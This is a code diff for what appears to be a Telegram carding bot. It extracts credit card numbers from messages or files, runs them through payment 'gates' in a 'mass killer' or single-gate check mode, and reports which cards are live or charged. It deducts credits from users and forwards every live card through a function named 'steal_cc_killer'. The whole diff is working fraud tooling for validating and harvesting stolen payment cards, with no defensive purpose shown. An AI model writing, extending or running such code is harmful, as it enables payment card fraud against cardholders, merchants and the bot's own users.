@@ -479,9 +479,9 @@ async def specific_mass_check(client, message):
         res = results[card_cc]
         await steal_cc_killer(client, message, card_cc, res)
 
-@app.on_message(filters.command(["mkiller", "mchk"]) & authorized_filter)
-async def mass_check(client, message):
-    # Anti-Flood for mass is stricter
+@app.on_message(filters.command("mkiller") & authorized_filter)
+async def mass_killer_cmd(client, message):
+    """💀 Mass KILLER - Runs card through ALL gates aggressively"""
     is_flood, remain = check_flood(message.from_user.id, wait_time=30)
     if is_flood:
         return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
@@ -494,22 +494,21 @@ async def mass_check(client, message):
     if not cards:
         return await message.reply("❌ <b>No cards found in text/file.</b>")
         
-    # CREDIT CHECK
-    if not update_user_credits(message.from_user.id, -5):
-        return await message.reply("⚠️ <b>Insufficient Credits for Mass!</b>\nNeed: 5 Credits\nType /start to check balance.")
+    # CREDIT CHECK - Killer costs more
+    if not update_user_credits(message.from_user.id, -10):
+        return await message.reply("⚠️ <b>Insufficient Credits for Killer!</b>\nNeed: 10 Credits\nType /start to check balance.")
     
     total = len(cards)
-    status_msg = await message.reply(f"💀 <b>Mass Killing {total} cards...</b>")
+    status_msg = await message.reply(f"💀 <b>KILLING {total} cards (ALL GATES)...</b>")
     
     async def update_status(checked, total):
-        if checked % 5 == 0 or checked == total: # Update every 5 cards to avoid rate limit
+        if checked % 5 == 0 or checked == total:
             try:
-                await status_msg.edit(f"💀 <b>Mass Killing...</b> \nProgress: <code>[{checked}/{total}]</code>")
+                await status_msg.edit(f"💀 <b>KILLER Mode...</b> \nProgress: <code>[{checked}/{total}]</code>")
             except: pass
 
     results = await mass_killer(cards, status_callback=update_status)
     
-    # Format Report
     lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
     
     report = f"""
@@ -518,7 +517,7 @@ async def mass_check(client, message):
 📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
 ✅ Live List:
 """
-    for card_cc in lives[:10]: # Top 10 lives
+    for card_cc in lives[:10]:
         report += f"• <code>{card_cc}</code>\n"
     
     if len(lives) > 10:
@@ -526,7 +525,63 @@ async def mass_check(client, message):
         
     await status_msg.edit(report)
     
-    # Auto Forward all lives
+    for card_cc in lives:
+        res = results[card_cc]
+        await steal_cc_killer(client, message, card_cc, res)
+
+@app.on_message(filters.command("mchk") & authorized_filter)
+async def mass_check_cmd(client, message):
+    """📊 Mass CHECK - Regular single-gate check"""
+    is_flood, remain = check_flood(message.from_user.id, wait_time=15)
+    if is_flood:
+        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
+
+    text, error = await get_text_from_message(client, message)
+    if error: return await message.reply(error)
+
+    cards = extract_cards(text)
+    
+    if not cards:
+        return await message.reply("❌ <b>No cards found in text/file.</b>")
+        
+    # CREDIT CHECK - Regular check costs less
+    if not update_user_credits(message.from_user.id, -5):
+        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits\nType /start to check balance.")
+    
+    total = len(cards)
+    status_msg = await message.reply(f"📊 <b>Checking {total} cards...</b>")
+    
+    async def update_status(checked, total):
+        if checked % 5 == 0 or checked == total:
+            try:
+                await status_msg.edit(f"📊 <b>Checking...</b> \nProgress: <code>[{checked}/{total}]</code>")
+            except: pass
+
+    # Use run_all_gates for simple check (fewer gates  than killer)
+    results = {}
+    checked = 0
+    for card in cards:
+        result = await run_all_gates(card)
+        results[card] = result
+        checked += 1
+        await update_status(checked, total)
+    
+    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
+    
+    report = f"""
+📊 <b>MASS CHECK COMPLETE</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+📊 Stats: <b>{len(lives)}/{total} LIVE</b>
+✅ Live List:
+"""
+    for card_cc in lives[:10]:
+        report += f"• <code>{card_cc}</code>\n"
+    
+    if len(lives) > 10:
+        report += f"<i>...and {len(lives)-10} more</i>"
+        
+    await status_msg.edit(report)
+    
     for card_cc in lives:
         res = results[card_cc]
         await steal_cc_killer(client, message, card_cc, res)
